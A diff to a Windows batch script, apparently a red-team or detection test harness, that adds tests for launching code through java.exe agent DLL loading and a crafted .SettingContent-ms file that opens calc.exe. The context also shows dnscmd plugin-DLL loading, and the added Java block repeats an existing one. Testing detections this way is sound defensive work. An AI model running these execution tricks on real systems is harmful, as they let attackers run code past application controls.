@@ -618,7 +618,11 @@ start "" cmd /c msconfig.exe
 echo Execution Finished at %time% %date%
 echo Command Excuted: msconfig.exe
 
+
+
 timeout 5
+
+
 
 echo %time% %date% [+] Testing DNSCMD DLL exec
 start "" cmd /c dnscmd ops_dc /config /serverlevelplugindll AllTheThings.dll 
@@ -626,6 +630,13 @@ echo Execution Finished at %time% %date%
 echo Command Excuted: dnscmd ops_dc /config /serverlevelplugindll AllTheThings.dll 
 
 timeout 5
+
+echo %time% %date% [+] Testing JAVA DLL exec
+start "" cmd /c java.exe -agentpath:AllTheThings.dll 
+start "" cmd /c java.exe -agentlib:AllTheThings.dll 
+echo Execution Finished at %time% %date%
+echo Command Excuted: java.exe -agentpath:AllTheThings.dll 
+echo Command Excuted: java.exe -agentlib:AllTheThings.dll  
 
 echo %time% %date% [+] Testing JAVA DLL exec
 start "" cmd /c java.exe -agentpath:AllTheThings.dll 
@@ -768,6 +779,31 @@ start "" cmd /c waitfor /s 127.0.0.1 /si SDX
 echo Execution Finished at %time% %date%
 echo Command Excuted: waitfor SDX & calc.exe
 echo Command Excuted: waitfor /s 127.0.0.1 /si SDX
+
+echo %time% %date% [+] Testing .SettingContent-ms extension exec
+echo ^<?xml version="1.0" encoding="UTF-8"?^> > Test.SettingContent-ms
+echo  ^<PCSettings^> >> Test.SettingContent-ms
+echo    ^<SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent"^> >> Test.SettingContent-ms
+echo      ^<ApplicationInformation^> >> Test.SettingContent-ms
+echo        ^<AppID^> windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel^</AppID^> >> Test.SettingContent-ms
+echo        ^<DeepLink^> %windir%\system32\calc.exe^</DeepLink^> >> Test.SettingContent-ms
+echo        ^<Icon^> %windir%\system32\control.exe^</Icon^> >> Test.SettingContent-ms
+echo      ^</ApplicationInformation^> >> Test.SettingContent-ms
+echo      ^<SettingIdentity^> >> Test.SettingContent-ms
+echo      ^<PageID^> ^</PageID^> >> Test.SettingContent-ms
+echo        ^<HostID^> {12B1697E-D3A0-4DBC-B568-CCF64A3F934D}^</HostID^> >> Test.SettingContent-ms
+echo      ^</SettingIdentity^> >> Test.SettingContent-ms
+echo      ^<SettingInformation^> >> Test.SettingContent-ms
+echo        ^<Description^> @shell32.dll,-4161^</Description^> >> Test.SettingContent-ms
+echo        ^<Keywords^> @shell32.dll,-4161^</Keywords^> >> Test.SettingContent-ms
+echo      ^</SettingInformation^> >> Test.SettingContent-ms
+echo    ^</SearchableContent^> >> Test.SettingContent-ms
+echo  ^</PCSettings^> >> Test.SettingContent-ms
+start "" cmd /c Test.SettingContent-ms
+echo Execution Finished at %time% %date%
+echo Command Excuted: Test.SettingContent-ms
+
+timeout 5
 
 
 REM ---- EOF Custom Payloads ----
@@ -925,6 +961,7 @@ start "" cmd /c reg delete "HKCU\Software\Microsoft\Command Processor" /v AutoRu
 taskkill /F /IM pass_TestBin.exe
 start "" cmd /c del pass.b64
 start "" cmd /c del pass_TestBin.exe
+start "" cmd /c del Test.SettingContent-ms
 
 echo "[+] Killing leftover binaries
 
